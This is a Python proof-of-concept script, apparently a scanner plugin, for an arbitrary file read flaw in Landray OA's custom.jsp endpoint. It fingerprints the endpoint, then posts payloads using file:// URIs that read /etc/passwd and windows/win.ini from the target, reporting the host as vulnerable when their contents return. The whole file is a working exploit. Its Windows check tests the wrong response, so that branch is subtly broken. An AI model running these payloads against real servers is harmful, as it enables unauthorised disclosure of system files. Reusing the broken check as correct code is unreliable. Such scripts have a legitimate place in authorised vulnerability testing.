import requests
import urllib, re

def verify(url):
    relsult = {
        'name': '蓝凌OA custom.jsp 任意文件读取漏洞',
        'vulnerable': False,
        'url': url,
        'attack': True,
        'about': 'https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw',
    }
    timeout = 3
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    vurl = urllib.parse.urljoin(url, '/sys/ui/extend/varkind/custom.jsp')
    data = 'var={"body":{"file":"file:///etc/passwd"}}'
    data2 = 'var={"body":{"file":"file:///c://windows/win.ini"}}'
    try:
        finger_rep = requests.get(vurl, headers=headers, verify=False, timeout=timeout, data=data)
        if re.search('/sys/ui/extend/', finger_rep.text) and finger_rep.status_code == 500:
            rep1 = requests.post(vurl, headers=headers, verify=False, timeout=timeout, data=data)
            rep2 = requests.post(vurl, headers=headers, verify=False, timeout=timeout, data=data2)
            if rep1.status_code == 200 and re.search('root:.*:0:0', rep1.text):
                relsult['vulnerable'] = True
                relsult['os'] = 'linux'
                relsult['vurl'] = vurl
            if rep2.status_code == 200 and re.search('for 16-bit app support', rep1.text):
                relsult['vulnerable'] = True
                relsult['os'] = 'windows'
                relsult['vurl'] = vurl
        return relsult
    except:
        return relsult